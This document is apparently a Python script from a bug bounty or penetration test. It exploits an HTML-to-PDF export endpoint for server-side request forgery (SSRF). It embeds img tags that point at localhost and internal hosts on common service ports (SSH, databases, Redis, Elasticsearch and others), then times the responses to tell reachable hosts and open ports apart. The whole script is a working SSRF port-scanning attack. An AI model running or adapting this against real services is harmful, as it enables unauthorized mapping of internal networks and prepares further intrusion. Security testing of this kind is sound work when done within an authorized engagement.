import json,subprocess,os,time,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def gen(html,name):
    t0=time.time()
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/document_intelligence/export/pdf',
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-d',json.dumps({"htmlContent":html,"fileName":name})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, round(time.time()-t0,2)
tag='zx'+uuid.uuid4().hex[:8]
# closed port on a REACHABLE host = fast RST; open port = fast too.
# unreachable host = 30s. Use this to distinguish host-reachable vs not.
hosts=[
 ('localhost','localhost'),
 ('integrations','integrations.qa.soxhubapp.com'),
 ('main-app','bugbounty1.qe.optrostaging.ai'),
]
ports=[22,80,443,3000,3306,5432,6379,8080,9200,11211,27017]
for label,host in hosts:
    print(f"--- {label} ({host}) ---")
    for p in ports:
        c,dt=gen(f'<img src="http://{host}:{p}/">',f"zx-{tag}-{label}-{p}")
        flag='  <<< SLOW/UNREACHABLE' if dt>10 else ''
        print(f"    :{p:<6} http={c} time={dt}s{flag}")
